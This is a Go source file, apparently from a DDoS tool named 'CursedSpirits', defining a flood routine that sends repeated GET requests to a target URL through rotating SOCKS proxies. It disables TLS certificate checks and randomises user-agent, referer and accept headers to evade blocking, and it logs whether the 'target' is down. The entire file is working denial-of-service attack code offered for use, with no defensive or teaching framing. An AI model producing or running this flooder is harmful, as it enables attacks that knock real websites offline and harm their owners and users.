package bot

import (
	"Pix4Devs/CursedSpirits/globals"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/corpix/uarand"
	"h12.io/socks"
)

type (
	FloodCtx struct {
		Target      string
		Concurrency int
		StopAt      int
		Client 		*http.Client
		Protocol string
	}
)

func (ctx *FloodCtx) Jujutsu(proxy string) {
	if int(time.Now().Unix()) >= ctx.StopAt {
		fmt.Println("Forced STOP due to flood duration exceeded given time")
		os.Kill.Signal()
	}

	ctx.Client.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Dial: socks.Dial(fmt.Sprintf("%s://%s", ctx.Protocol, proxy)),
		ForceAttemptHTTP2: true,
		MaxConnsPerHost: 0,
	}

	var body io.ReadCloser
	req, err := http.NewRequest("GET", ctx.Target, body); if err != nil {
		return
	}

	{
		req.Header.Add("cache-control", "must-revalidate")
		req.Header.Add("user-agent", uarand.GetRandom())
		req.Header.Add("referer", globals.REFS[rand.Intn(len(globals.REFS))])
		req.Header.Add("accept", globals.ACCEPTS[rand.Intn(len(globals.ACCEPTS))])
	}

	
	for i := 0; i < ctx.Concurrency; i++ {
		resp, err := ctx.Client.Do(req); if err != nil {
			continue
		}

		if resp.StatusCode >= 200 && resp.StatusCode <= 399 {
			fmt.Printf("[SEND PAYLOAD] [---%s---]\r", proxy)
		} else if resp.StatusCode >= 400 && resp.StatusCode  <= 599 {
			fmt.Printf("[TARGET DOWN OR BLOCK] [---%s---]\r", proxy)
		}
	}
}